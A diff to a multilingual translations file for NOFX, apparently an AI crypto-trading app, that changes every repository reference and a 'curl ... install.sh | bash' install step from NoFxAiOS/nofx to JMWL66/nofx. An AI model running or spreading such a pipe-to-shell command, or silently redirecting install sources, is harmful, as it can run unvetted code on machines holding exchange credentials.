@@ -604,7 +604,7 @@ export const translations = {
       'Four simple steps to start your AI automated trading journey',
     step1Title: 'Clone GitHub Repository',
     step1Desc:
-      'git clone https://github.com/NoFxAiOS/nofx and switch to dev branch to test new features.',
+      'git clone https://github.com/JMWL66/nofx and switch to dev branch to test new features.',
     step2Title: 'Configure Environment',
     step2Desc:
       'Frontend setup for exchange APIs (like Binance, Hyperliquid), AI models and custom prompts.',
@@ -698,7 +698,7 @@ export const translations = {
     // ===== INSTALLATION =====
     faqHowToInstall: 'How do I install NOFX?',
     faqHowToInstallAnswer:
-      'Easiest method (Linux/macOS): Run "curl -fsSL https://raw.githubusercontent.com/NoFxAiOS/nofx/main/install.sh | bash" - this installs Docker containers automatically. Then open http://127.0.0.1:3000 in your browser. For manual installation or development, clone the repository and follow the README instructions.',
+      'Easiest method (Linux/macOS): Run "curl -fsSL https://raw.githubusercontent.com/JMWL66/nofx/main/install.sh | bash" - this installs Docker containers automatically. Then open http://127.0.0.1:3000 in your browser. For manual installation or development, clone the repository and follow the README instructions.',
 
     faqWindowsInstallation: 'How do I install on Windows?',
     faqWindowsInstallationAnswer:
@@ -710,7 +710,7 @@ export const translations = {
 
     faqManualInstallation: 'How do I install manually for development?',
     faqManualInstallationAnswer:
-      'Prerequisites: Go 1.21+, Node.js 18+, TA-Lib. Steps: 1) Clone repo: "git clone https://github.com/NoFxAiOS/nofx.git"; 2) Install backend deps: "go mod download"; 3) Install frontend deps: "cd web && npm install"; 4) Build backend: "go build -o nofx"; 5) Run backend: "./nofx"; 6) Run frontend (new terminal): "cd web && npm run dev". Access at http://127.0.0.1:3000',
+      'Prerequisites: Go 1.21+, Node.js 18+, TA-Lib. Steps: 1) Clone repo: "git clone https://github.com/JMWL66/nofx.git"; 2) Install backend deps: "go mod download"; 3) Install frontend deps: "cd web && npm install"; 4) Build backend: "go build -o nofx"; 5) Run backend: "./nofx"; 6) Run frontend (new terminal): "cd web && npm run dev". Access at http://127.0.0.1:3000',
 
     faqServerDeployment: 'How do I deploy to a remote server?',
     faqServerDeploymentAnswer:
@@ -865,7 +865,7 @@ export const translations = {
 
     faqPRGuidelines: 'What are the PR guidelines?',
     faqPRGuidelinesAnswer:
-      'PR Process: 1) Fork repo to your account; 2) Create feature branch from dev: "git checkout -b feat/your-feature"; 3) Make changes, run lint: "npm --prefix web run lint"; 4) Commit with Conventional Commits format; 5) Push and create PR to NoFxAiOS/nofx:dev; 6) Reference related issue (Closes #123); 7) Wait for review. Keep PRs small and focused.',
+      'PR Process: 1) Fork repo to your account; 2) Create feature branch from dev: "git checkout -b feat/your-feature"; 3) Make changes, run lint: "npm --prefix web run lint"; 4) Commit with Conventional Commits format; 5) Push and create PR to JMWL66/nofx:dev; 6) Reference related issue (Closes #123); 7) Wait for review. Keep PRs small and focused.',
 
     faqBountyProgram: 'Is there a bounty program?',
     faqBountyProgramAnswer:
@@ -1919,7 +1919,7 @@ export const translations = {
     fourSimpleSteps: '四个简单步骤，开启 AI 自动交易之旅',
     step1Title: '拉取 GitHub 仓库',
     step1Desc:
-      'git clone https://github.com/NoFxAiOS/nofx 并切换到 dev 分支测试新功能。',
+      'git clone https://github.com/JMWL66/nofx 并切换到 dev 分支测试新功能。',
     step2Title: '配置环境',
     step2Desc:
       '前端设置交易所 API（如 Binance、Hyperliquid）、AI 模型和自定义提示词。',
@@ -2009,7 +2009,7 @@ export const translations = {
     // ===== 安装部署 =====
     faqHowToInstall: '如何安装 NOFX？',
     faqHowToInstallAnswer:
-      '最简单的方法（Linux/macOS）：运行 "curl -fsSL https://raw.githubusercontent.com/NoFxAiOS/nofx/main/install.sh | bash" - 这会自动安装 Docker 容器。然后在浏览器中打开 http://127.0.0.1:3000。手动安装或开发请克隆仓库并按照 README 说明操作。',
+      '最简单的方法（Linux/macOS）：运行 "curl -fsSL https://raw.githubusercontent.com/JMWL66/nofx/main/install.sh | bash" - 这会自动安装 Docker 容器。然后在浏览器中打开 http://127.0.0.1:3000。手动安装或开发请克隆仓库并按照 README 说明操作。',
 
     faqWindowsInstallation: 'Windows 如何安装？',
     faqWindowsInstallationAnswer:
@@ -2021,7 +2021,7 @@ export const translations = {
 
     faqManualInstallation: '如何手动安装用于开发？',
     faqManualInstallationAnswer:
-      '前置条件：Go 1.21+、Node.js 18+、TA-Lib。步骤：1）克隆仓库："git clone https://github.com/NoFxAiOS/nofx.git"；2）安装后端依赖："go mod download"；3）安装前端依赖："cd web && npm install"；4）构建后端："go build -o nofx"；5）运行后端："./nofx"；6）运行前端（新终端）："cd web && npm run dev"。访问 http://127.0.0.1:3000',
+      '前置条件：Go 1.21+、Node.js 18+、TA-Lib。步骤：1）克隆仓库："git clone https://github.com/JMWL66/nofx.git"；2）安装后端依赖："go mod download"；3）安装前端依赖："cd web && npm install"；4）构建后端："go build -o nofx"；5）运行后端："./nofx"；6）运行前端（新终端）："cd web && npm run dev"。访问 http://127.0.0.1:3000',
 
     faqServerDeployment: '如何部署到远程服务器？',
     faqServerDeploymentAnswer:
@@ -2176,7 +2176,7 @@ export const translations = {
 
     faqPRGuidelines: 'PR 指南是什么？',
     faqPRGuidelinesAnswer:
-      'PR 流程：1）Fork 仓库到您的账户；2）从 dev 创建功能分支："git checkout -b feat/your-feature"；3）修改代码，运行 lint："npm --prefix web run lint"；4）使用 Conventional Commits 格式提交；5）推送并创建 PR 到 NoFxAiOS/nofx:dev；6）关联相关 issue（Closes #123）；7）等待审核。保持 PR 小而聚焦。',
+      'PR 流程：1）Fork 仓库到您的账户；2）从 dev 创建功能分支："git checkout -b feat/your-feature"；3）修改代码，运行 lint："npm --prefix web run lint"；4）使用 Conventional Commits 格式提交；5）推送并创建 PR 到 JMWL66/nofx:dev；6）关联相关 issue（Closes #123）；7）等待审核。保持 PR 小而聚焦。',
 
     faqBountyProgram: '有赏金计划吗？',
     faqBountyProgramAnswer:
@@ -3164,7 +3164,7 @@ export const translations = {
     howToStart: 'Cara Memulai NOFX',
     fourSimpleSteps: 'Empat langkah sederhana untuk memulai perjalanan trading AI otomatis Anda',
     step1Title: 'Clone Repository GitHub',
-    step1Desc: 'git clone https://github.com/NoFxAiOS/nofx dan beralih ke branch dev untuk menguji fitur baru.',
+    step1Desc: 'git clone https://github.com/JMWL66/nofx dan beralih ke branch dev untuk menguji fitur baru.',
     step2Title: 'Konfigurasi Lingkungan',
     step2Desc: 'Setup frontend untuk API bursa (seperti Binance, Hyperliquid), model AI dan prompt kustom.',
     step3Title: 'Deploy & Jalankan',
@@ -3223,7 +3223,7 @@ export const translations = {
     faqSystemRequirements: 'Apa persyaratan sistem?',
     faqSystemRequirementsAnswer: 'Minimum: 2 core CPU, 2GB RAM, 1GB disk, internet stabil. Direkomendasikan: 4GB RAM untuk menjalankan beberapa trader. OS yang didukung: Linux, macOS, atau Windows (via Docker atau WSL2).',
     faqHowToInstall: 'Bagaimana cara menginstal NOFX?',
-    faqHowToInstallAnswer: 'Metode termudah (Linux/macOS): Jalankan "curl -fsSL https://raw.githubusercontent.com/NoFxAiOS/nofx/main/install.sh | bash" - ini menginstal kontainer Docker secara otomatis. Lalu buka http://127.0.0.1:3000 di browser Anda.',
+    faqHowToInstallAnswer: 'Metode termudah (Linux/macOS): Jalankan "curl -fsSL https://raw.githubusercontent.com/JMWL66/nofx/main/install.sh | bash" - ini menginstal kontainer Docker secara otomatis. Lalu buka http://127.0.0.1:3000 di browser Anda.',
     faqWindowsInstallation: 'Bagaimana cara menginstal di Windows?',
     faqWindowsInstallationAnswer: 'Tiga opsi: 1) Docker Desktop (Direkomendasikan); 2) WSL2 - Instal Windows Subsystem for Linux; 3) Docker di WSL2. Akses via http://127.0.0.1:3000',
     faqDockerDeployment: 'Deployment Docker terus gagal',
@@ -3303,7 +3303,7 @@ export const translations = {
     faqHowToContribute: 'Bagaimana cara berkontribusi ke NOFX?',
     faqHowToContributeAnswer: 'NOFX open-source dan menyambut kontribusi! Cara: 1) Kode - perbaiki bug, tambah fitur; 2) Dokumentasi; 3) Laporan Bug; 4) Ide Fitur. Semua kontributor mungkin mendapat reward airdrop.',
     faqPRGuidelines: 'Apa panduan PR?',
-    faqPRGuidelinesAnswer: 'Proses PR: 1) Fork repo; 2) Buat branch fitur dari dev; 3) Buat perubahan, jalankan lint; 4) Commit dengan format Conventional Commits; 5) Push dan buat PR ke NoFxAiOS/nofx:dev.',
+    faqPRGuidelinesAnswer: 'Proses PR: 1) Fork repo; 2) Buat branch fitur dari dev; 3) Buat perubahan, jalankan lint; 4) Commit dengan format Conventional Commits; 5) Push dan buat PR ke JMWL66/nofx:dev.',
     faqBountyProgram: 'Apakah ada program bounty?',
     faqBountyProgramAnswer: 'Ya! Kontributor mendapat reward airdrop berdasarkan kontribusi. Issue dengan label "bounty" memiliki reward uang tunai.',
     faqReportBugs: 'Bagaimana cara melaporkan bug?',
